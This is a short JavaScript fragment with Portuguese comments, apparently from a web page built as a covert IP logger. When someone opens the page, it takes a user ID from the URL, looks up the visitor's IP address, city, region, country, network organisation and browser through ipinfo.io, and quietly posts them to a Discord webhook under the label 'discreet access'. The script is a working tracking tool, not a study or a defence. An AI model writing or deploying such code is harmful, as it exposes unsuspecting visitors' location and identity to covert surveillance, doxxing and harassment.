      // Captura ID da URL: ?id=1045114291231146004
      const params = new URLSearchParams(window.location.search);
      const userId = params.get("id") || "ID não informado";

      // Captura IP com API pública
      fetch("https://ipinfo.io/json?token=SEU_TOKEN_AQUI")
        .then(response => response.json())
        .then(data => {
          const info = {
            user_id: userId,
            ip: data.ip,
            cidade: data.city,
            regiao: data.region,
            pais: data.country,
            org: data.org,
            navegador: navigator.userAgent
          };

          // Envia para o Discord (webhook)
          fetch("https://discord.com/api/webhooks/SEU_WEBHOOK", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: `🕵️‍♂️ Acesso discreto:\n\n🧠 ID: ${info.user_id}\n🌐 IP: ${info.ip}\n📍 Local: ${info.cidade}, ${info.regiao} - ${info.pais}\n🏢 Org: ${info.org}\n🧭 Navegador: ${info.navegador}`
            })
          });
        })
        .catch(err => console.error("Erro ao obter IP:", err));
    </script>
